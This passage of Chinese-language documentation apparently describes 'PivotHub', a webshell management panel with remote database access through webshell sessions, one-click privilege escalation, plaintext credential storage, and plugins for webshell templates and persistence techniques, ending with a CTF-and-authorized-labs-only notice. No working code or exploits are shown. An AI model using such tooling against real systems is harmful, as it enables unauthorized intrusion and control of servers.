- **数据库面板**：选中连接即**自动探测结构**（库 → 表 → 列，含类型 / 主键 / 可空 / 行数），点表名直接
  预览数据；命令经会话在目标执行 `mysql` / `psql` / `redis-cli` / `sqlite3` / `sqlcmd`（无需本机驱动），
  回显优先 **base64 回传**（避免 WebShell 通道字符集把中文变成 `?`，目标无 base64 时自动退回明文），
  本机 SQLite 走 Python 内置模块。密码与凭据库同样明文存储（本机授权场景）；
- **Shell 管理 · 一键提权**：终端面板底部一键执行「采集事实 → 匹配规则库 → 执行最可信路径」，
  命中结果与执行命令都会打印在虚拟终端里；
- **插件市场**：数据插件（命令库 / 马模板 / 固化技法 / 提权规则），清单默认读 `data/plugins/registry.json`，
  可用 `PIVOTHUB_PLUGIN_REGISTRY` 指向远程清单；安装后并入对应视图，停用即撤下（不执行第三方代码）；
- 冰蝎/哥斯拉协议（M1-7）为 PRD 二期内容，未包含。

---

## 10. 合规声明

本工具及本界面**仅用于 CTF 竞赛、授权靶场与教学演示**，禁止对任何未授权的真实目标使用。
面板设计为仅监听 `127.0.0.1`，不对外暴露；不内置任何针对真实目标的 exploit。
